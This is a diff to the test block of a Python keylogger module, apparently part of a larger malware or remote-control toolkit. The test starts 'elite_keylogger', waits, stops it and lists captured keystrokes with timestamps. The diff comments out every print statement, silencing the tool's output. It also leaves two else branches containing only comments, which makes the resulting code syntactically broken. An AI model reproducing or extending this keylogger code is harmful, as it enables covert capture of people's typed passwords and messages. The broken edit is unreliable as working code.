@@ -419,34 +419,34 @@ def get_captured_keys(clear_after_read: bool = False) -> List[Dict[str, Any]]:
 
 if __name__ == "__main__":
     # Test the elite keylogger command
-    print("Testing Elite Keylogger Command...")
+    # print("Testing Elite Keylogger Command...")
     
     # Test start keylogger
     result = elite_keylogger(duration=5)  # 5 second test
     
     if result['success']:
-        print(f"✅ Keylogger started successfully!")
-        print(f"Method: {result['method']}")
-        print(f"Duration: {result['duration']}")
+    # print(f"✅ Keylogger started successfully!")
+    # print(f"Method: {result['method']}")
+    # print(f"Duration: {result['duration']}")
         
         # Wait for test duration
-        print("Waiting for keylogger test...")
+    # print("Waiting for keylogger test...")
         time.sleep(6)
         
         # Stop keylogger
         stop_result = elite_stopkeylogger()
         
         if stop_result['success']:
-            print(f"✅ Keylogger stopped successfully!")
-            print(f"Keys captured: {stop_result['total_keys']}")
+    # print(f"✅ Keylogger stopped successfully!")
+    # print(f"Keys captured: {stop_result['total_keys']}")
             
             if stop_result['captured_keys']:
-                print("Sample captured keys:")
+    # print("Sample captured keys:")
                 for key_info in stop_result['captured_keys'][:5]:
-                    print(f"  {key_info['key']} at {key_info['timestamp']}")
+    # print(f"  {key_info['key']} at {key_info['timestamp']}")
         else:
-            print(f"⚠️ Keylogger stop issue: {stop_result['error']}")
+    # print(f"⚠️ Keylogger stop issue: {stop_result['error']}")
     else:
-        print(f"❌ Keylogger failed to start: {result['error']}")
+    # print(f"❌ Keylogger failed to start: {result['error']}")
     
-    print("Elite Keylogger command test complete")
+    # print("Elite Keylogger command test complete")
